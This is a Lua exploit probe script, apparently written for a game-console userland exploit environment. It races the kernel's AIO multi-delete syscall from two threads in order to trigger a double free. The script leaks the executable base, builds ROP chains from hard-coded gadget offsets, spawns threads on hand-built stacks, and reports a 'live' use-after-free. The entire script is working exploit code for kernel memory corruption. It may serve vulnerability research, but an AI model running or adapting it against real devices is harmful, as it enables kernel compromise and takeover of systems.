-- CRASH_CLASS: HIGH
-- PROBE 65k: aio_multi_delete TOCTOU — multi-ID race
--
-- 65j: single-ID race always serializes (A wins). The TOCTOU is
-- WITHIN the multi-delete loop: for each ID, 662 locks, looks up,
-- unlocks to free sub-objects, relocks to continue. Two concurrent
-- 662 calls iterating the SAME array of N IDs gives N chances for
-- overlap per iteration.
--
-- Strategy: submit 16 AIO requests, poll all, then both children
-- call 662(ids, 16, states) on the same ID array simultaneously.

print("=== PROBE 65k: aio race — multi-ID ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

-- Signals
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- /dev/zero
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local BATCH = 16

-- AIO submission buffers
local reqs = memory.alloc(0x28 * BATCH + 0x100)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local submit_ids = memory.alloc(4 * BATCH + 0x10)

-- Shared delete arrays (both children read from the SAME ids array)
local del_ids = memory.alloc(4 * BATCH + 0x100)
-- Separate state arrays per child
local states_A = memory.alloc(4 * BATCH + 0x100)
local states_B = memory.alloc(4 * BATCH + 0x100)
-- Poll buffer
local poll_ids = memory.alloc(4 * BATCH + 0x100)
local poll_st = memory.alloc(4 * BATCH + 0x100)

local function fill_req(idx, fd)
    local base = N(reqs) + idx * 0x28
    wq(base + 0x00, uint64(0))
    wq(base + 0x08, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(base + 0x10, bl); wd(base + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(base + 0x18, rl); wd(base + 0x1C, rh)
    wd(base + 0x20, fd); wd(base + 0x24, 0)
end

local function submit_batch(count)
    for i = 0, count - 1 do
        fill_req(i, fd_zero)
        wd(N(submit_ids) + i * 4, 0)
    end
    wd(N(result_buf), 0)
    local ok, rv = pcall(function()
        return mk(669)(uint64(1), uint64(N(reqs)), uint64(count), uint64(1), uint64(N(submit_ids)))
    end)
    local ids = {}
    for i = 0, count - 1 do
        ids[i + 1] = rd(N(submit_ids) + i * 4) or 0
    end
    return ok and sgn(rv) or nil, ids
end

local function poll_batch(ids)
    local count = #ids
    for i = 0, count - 1 do
        wd(N(poll_ids) + i * 4, ids[i + 1])
        wd(N(poll_st) + i * 4, 0)
    end
    pcall(function()
        mk(664)(uint64(N(poll_ids)), uint64(count), uint64(N(poll_st)))
    end)
end

local function delete_lua(ids)
    local count = #ids
    for i = 0, count - 1 do
        wd(N(poll_ids) + i * 4, ids[i + 1])
        wd(N(poll_st) + i * 4, 0xDEAD)
    end
    pcall(function()
        mk(662)(uint64(N(poll_ids)), uint64(count), uint64(N(poll_st)))
    end)
    local states = {}
    for i = 0, count - 1 do
        states[i + 1] = rd(N(poll_st) + i * 4) or 0
    end
    return states
end

-- [A] Sanity: submit batch, poll, delete
print("")
print("[A] sanity — batch " .. BATCH)
local s_ret, s_ids = submit_batch(BATCH)
print(string.format("  submit: ret=%s count=%d first=0x%X last=0x%X",
    tostring(s_ret), #s_ids, s_ids[1] or 0, s_ids[BATCH] or 0))

poll_batch(s_ids)
local d_states = delete_lua(s_ids)
local all_ok = true
for i = 1, BATCH do
    if d_states[i] ~= 0 then all_ok = false end
end
print(string.format("  delete: %s (first=0x%X last=0x%X)",
    all_ok and "ALL OK" or "SOME FAILED", d_states[1] or 0, d_states[BATCH] or 0))
if not all_ok then
    for i = 1, BATCH do
        if d_states[i] ~= 0 then
            print(string.format("    [%d] state=0x%X", i, d_states[i]))
        end
    end
end

if not alive() then print("DEAD"); return end

-- [B] RACE: two children both call 662(del_ids, BATCH, their_states)
print("")
print("[B] RACE — 2 children × " .. BATCH .. " IDs")

local ITERS = 20
local race_hits = 0
local kptrs = 0
local process_dead = false

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** DEAD (UAF crash?) ***", iter))
        process_dead = true
        break
    end

    -- Submit + poll batch
    local sr, ids = submit_batch(BATCH)
    if sr ~= 0 then
        print(string.format("  iter %d: submit failed", iter))
        break
    end
    poll_batch(ids)

    -- Write shared ID array (both children read from this)
    for i = 0, BATCH - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
    end
    -- Init state arrays with sentinels
    for i = 0, BATCH - 1 do
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    -- Build child A: 662(del_ids, BATCH, states_A) + thr_exit
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end

    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(BATCH))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- Build child B: 662(del_ids, BATCH, states_B) + thr_exit
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end

    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(BATCH))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    -- Params
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)

    -- Spawn both
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait
    for w = 1, 50000 do local _ = rd(sb_A) end

    -- Read results: count how many IDs both children deleted (state=0)
    local a_success = 0
    local b_success = 0
    local both_success = 0
    for i = 0, BATCH - 1 do
        local sa = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sb = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sa == 0 then a_success = a_success + 1 end
        if sb == 0 then b_success = b_success + 1 end
        if sa == 0 and sb == 0 then
            both_success = both_success + 1
        end
    end

    if both_success > 0 then
        race_hits = race_hits + both_success
        print(string.format("  iter %d: *** %d DOUBLE DELETES *** (A=%d B=%d)",
            iter, both_success, a_success, b_success))
    elseif iter <= 3 or iter == ITERS then
        print(string.format("  iter %d: A=%d/%d B=%d/%d doubles=%d",
            iter, a_success, BATCH, b_success, BATCH, both_success))
    elseif iter == 4 then
        print("  ...")
    end
end

print("")
print("[C] SUMMARY")
print(string.format("  iterations:      %d", ITERS))
print(string.format("  batch size:      %d", BATCH))
print(string.format("  DOUBLE DELETES:  %d (total across all iters)", race_hits))
print(string.format("  kernel pointers: %d", kptrs))
print(string.format("  process:         %s", alive() and "ALIVE" or "DEAD"))

if race_hits > 0 then
    print("")
    print("****************************************************")
    print("*** DOUBLE FREE CONFIRMED — UAF IS LIVE          ***")
    print("****************************************************")
elseif process_dead then
    print("")
    print("Process died during race — possible UAF crash!")
end

print("")
print("=== 65k COMPLETE ===")
